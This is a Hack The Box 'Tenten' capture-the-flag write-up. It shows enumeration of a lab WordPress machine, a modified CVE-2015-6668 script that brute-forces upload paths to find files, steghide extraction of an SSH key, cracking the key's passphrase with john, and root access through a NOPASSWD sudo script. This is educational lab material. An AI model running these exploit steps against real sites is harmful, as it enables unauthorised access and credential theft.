### Introduction 
Hack the box Tenten is an easy-medium level machine. This challenge highlights the security vulnerabilities that are associated with Wordpress plugins that are outdated - this is a major vulnerable area that exsists in the real world. To get started on this challenge, one just needs to know basic enumeration methods and the basics of Linux. Doing this challenge, I learned how to enumerate Wordpress websites, exploit NOPASSWD files, use steganography tools, use some john the ripper for RSA cracking, and modify exploits. 

### Enumeration
To first enumerate the service, I run an nmap scan: ```nmap -sC -sV -oA scan 10.10.10.10```. This will create a file called ```scan.nmap``` which we can ```cat```. One can similarly use zenmap to get similar output. Shown below is the output the nmap scan gave me and the nmap report of the ports/hosts:
```
nmap -sC -sV -oA scan 10.10.10.10
Nmap scan report for 10.10.10.10
Host is up (0.061s latency).

So we see that OpenSSH is open. We also see that the machine is running an Apache server with Wordpress, let's check out the website:

![tenten](https://user-images.githubusercontent.com/41026969/52909859-c41b1500-325c-11e9-82b6-306798925e27.PNG)

Investigating the page, we see that it's running a basic version of Wordpress. We can do further enumeration using ```wpscan```.

The command I use is:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# wpscan --url http://10.10.10.10 --enumerate u 
```

This allows us the scan for potential vulnerabilities as well as enumerate users. This is what it outputs:

### Exploitation

We see there is one username which is ```Takis```. Furthermore, we see there's an old job manager plugin with a few vulnerabilities that ```wpscan``` has shown us. Basically we are able to view different job applications and pages by changing the URL. For example, on this site, (from the homepage ```10.10.10.10```) we can click on ```Job Listing``` and ```Apply Now```. This will bring us to the following URL:
```
http://10.10.10.10/index.php/jobs/apply/8/
```

We can edit the ```/8/``` and play around with the numbers to view pages we aren't supposed to view.

Using curl and the source page (doing ```CTRL + U``` for source page), we can simply type up a script to check the different page titles in the source page. Here's what I typed up:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# for i in $(seq 1 20); do echo -n "$i: "; curl -s http://10.10.10.10/index.php/jobs/apply/$i/ | grep '<title>'; done
```

Here's what it outputted:

We see an interesting title page called ```HackerAccessGranted```...

Going back through the ```wpscan``` and looking through each link, [this website](https://vagmour.eu/cve-2015-6668-cv-filename-disclosure-on-job-manager-wordpress-plugin/) has python code we can edit to get the picture ```HackerAccessGranted``` uploaded. Looking at the python code, I noticed it had some outdated dates and the file types had to be changed since we're looking for a picture, here's what I updated the code to (also attached python file above):
```python
import requests

print """  
CVE-2015-6668

"""  
website = raw_input('Enter a vulnerable website: ')  
filename = raw_input('Enter a file name: ')

filename2 = filename.replace(" ", "-")

for year in range(2013,2019):  
    for i in range(1,13):
        for extension in {'jpg','png','jpeg'}:
            URL = website + "/wp-content/uploads/" + str(year) + "/" + "{:02}".format(i) + "/" + filename2 + "." + extension
            req = requests.get(URL)
            if req.status_code==200:
                print "[+] URL of CV found! " + URL
 ```
Now running the code we get the link to the picture:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# python edited_exploit.py 
  
CVE-2015-6668  
Title: CV filename disclosure on Job-Manager WP Plugin  
Author: Evangelos Mourikis  
Blog: https://vagmour.eu  
Plugin URL: http://www.wp-jobmanager.com  
Versions: <=0.7.25  

Enter a vulnerable website: http://10.10.10.10
Enter a file name: HackerAccessGranted
[+] URL of CV found! http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
```
The picture of the file:

![HackerAccessGranted](https://user-images.githubusercontent.com/41026969/57188672-e07c3480-6ed0-11e9-92c5-3aef6963d9c5.jpg)

Doing several checks like binwalk and strings, nothing showed up. After installing ```steghide``` (a steganography tool) I did further analysis:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# steghide extract -sf HackerAccessGranted.jpg 
Enter passphrase: 
wrote extracted data to "id_rsa".
```

Doing ```cat id_rsa``` we see that hidden in the image there's an RSA key!

Using [this website](http://www.cables.ws/cracking-rsa-private-key-passphrase-with-john-the-ripper/) as reference, I was able to crack the RSA key shown below:

First I converted it to john format and saved it as ```id_rsa_johnfile```:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# ssh2john id_rsa > id_rsa_johnfile
```

Then since I've never used the ```rockyou.txt``` wordlist (which is usually the default people use to CTF), I had to unzip it:
```
root@josh0402:~/Desktop/Hacky Sack/!PenTesting/htb-tenten# sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Last, we can do ```john -show ida_rsa_johnfile``` to view the cracked password:

![image](https://user-images.githubusercontent.com/41026969/57188856-d445a680-6ed3-11e9-99ce-a0162ee28c89.png)

Now we can try to log into Takis (the user we found from the ```wpscan``` from above) using the passphrase ```superpassword```.

##### note: you may need to do ```chmod 600 id_rsa``` to change the permissions for the originally rsa key

![image](https://user-images.githubusercontent.com/41026969/57188895-b167c200-6ed4-11e9-89f5-edb44aea436d.png)

We got a shell along with the ```user``` flag. Doing a quick ```sudo -l``` check reveals we can run a bash script called ```fuckin``` at ```/bin/fuckin```. Looking at what it does it simply executes arguments.

Doing ```sudo /bin/fuckin bash``` gets us root!

### Flags:
user: ```/home/takis/user.txt```

root: ```/root/root.txt```
